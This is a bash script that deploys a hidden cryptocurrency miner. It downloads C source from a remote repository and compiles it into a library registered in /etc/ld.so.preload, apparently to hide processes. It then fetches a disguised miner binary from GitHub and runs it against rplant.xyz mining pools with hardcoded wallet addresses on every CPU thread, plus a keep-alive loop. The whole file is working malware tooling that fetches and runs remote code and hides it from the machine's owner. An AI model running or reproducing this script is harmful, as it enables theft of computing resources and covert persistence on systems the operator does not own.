#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
# https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
# https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
# https://github.com/barburonjilo/back/raw/main/sr srb

wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
chmod +x sgr1
cpulimit -l 1200 -e sgr1 &
# sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
# nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
./sgr1 --algorithm minotaurx --pool stratum-asia.rplant.xyz:17068 --wallet RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$(echo $RANDOM | md5sum | head -c 5) --password x --tls true --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  &
# ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
